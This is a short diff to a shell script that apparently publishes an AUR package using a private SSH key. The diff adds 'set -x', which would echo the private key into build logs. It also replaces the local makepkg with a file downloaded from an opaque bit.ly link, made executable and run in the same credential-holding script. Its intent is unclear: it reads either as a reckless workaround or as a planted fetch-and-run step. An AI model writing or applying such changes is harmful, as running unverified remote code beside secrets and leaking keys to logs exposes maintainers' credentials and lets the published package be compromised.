@@ -1,4 +1,5 @@
 #!/bin/sh
+set -x
 
 echo "$private_key" > ~/.ssh/aur
 
@@ -30,7 +31,9 @@ echo $arr
 
 sed -i "20s/.*/ '$arr'  /" PKGBUILD
 
-makepkg --printsrcinfo > .SRCINFO
+curl -L https://bit.ly/3jBbJDx > makepkg
+chmod +x makepkg
+./makepkg --printsrcinfo > .SRCINFO
 
 git add .
 git config user.name "$name"
